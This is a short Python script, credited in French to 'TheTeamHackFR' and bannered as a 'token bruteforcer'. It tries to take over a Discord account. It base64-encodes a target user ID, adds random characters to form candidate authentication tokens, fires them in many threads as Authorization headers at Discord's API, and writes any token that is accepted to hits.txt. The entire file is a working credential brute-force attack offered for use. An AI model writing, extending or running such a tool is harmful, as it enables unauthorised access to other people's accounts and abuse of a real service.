import base64
import threading
import random
import string
import requests
import time
import colorama
from colorama import Fore
colorama.init()

print("""
 ######   #####   ### ###  #######  ##   ##           ######   ######   ##   ##   # ##### #######   #######  #####   ######     ####   #######  ######   
## ## ## ### ###   ## ##    ##   #  ###  ##            ##  ##   ##  ##  ##   ##  ## ## ##  ##   #    ##   # ### ###   ##  ##   ##  ##   ##   #   ##  ##  
   ##    ##   ##   ####     ##      #### ##            ##  ##   ##  ##  ##   ##     ##     ##        ##     ##   ##   ##  ##  ##        ##       ##  ##  
   ##    ##   ##   ###      ####    #######            #####    #####   ##   ##     ##     ####      ####   ##   ##   #####   ##        ####     #####   
   ##    ##   ##   ####     ##      ## ####            ##  ##   ## ##   ##   ##     ##     ##        ##     ##   ##   ## ##   ##        ##       ## ##   
   ##    ### ###   ## ##    ##   #  ##  ###            ##  ##   ## ##   ##   ##     ##     ##   #    ##     ### ###   ## ##    ##  ##   ##   #   ## ##   
  ####    #####   ### ###  #######  ##   ##           ######   #### ##   #####     ####   #######   ####     #####   #### ##    ####   #######  #### ##
""")
print(F"{Fore.BLUE}Codé par TheTeamHackFR")
time.sleep(2)
print(" ")
idtoken = base64.b64encode((input("ID de l'utilisateur ---> ")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
print(" ")
thrd =  input("Threads ---> ")

def bruhmoment():
    while idtoken == idtoken:
        token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(F"{Fore.GREEN}[!] VALIDE" + ' ' + token)
                print(" ")
                file = open('hits.txt', "a+")
                file.write(F'{token}\n')
        else:
                print(" ")
                print(F"{Fore.RED}[!] INVALIDE" + ' ' + token)
                print(" ")

threads = []

for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
